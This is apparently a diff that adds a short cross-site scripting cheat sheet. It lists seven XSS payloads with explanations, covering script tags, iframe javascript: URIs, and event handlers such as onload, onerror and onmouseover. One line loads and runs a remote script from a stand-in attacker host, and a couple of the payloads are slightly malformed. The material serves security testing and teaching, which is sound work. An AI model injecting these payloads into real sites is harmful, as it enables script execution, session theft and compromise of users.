@@ -1,0 +1,7 @@
+<script>alert(1)</script>                         This is the most generic XSS payload. It will generate a popup box if the payload succeeds.
+<iframe src=javascript:alert(1)>                  This payload loads JavaScript code within an iframe. It’s useful when <script> tags are banned by the XSS filter.
+<body onload=alert(1)>                            This payload is useful when your input string can’t contain the term script. It inserts an HTML element that will run JavaScript automatically after it’s loaded.
+"><img src=x onerror=prompt(1);>                  This payload closes out the previous tag. It then injects an <img> tag with an invalid source URL. Once the tag fails to load, it will run the JavaScript specified in the onerror attribute.
+<script>alert(1)<!–                               <!- is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document to prevent syntax errors.
+<a onmouseover"alert(1)">test</a>                 This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor.
+<script src=//attacker.com/test.js>               This payload causes the browser to load and run an external script hosted on the attacker’s server.
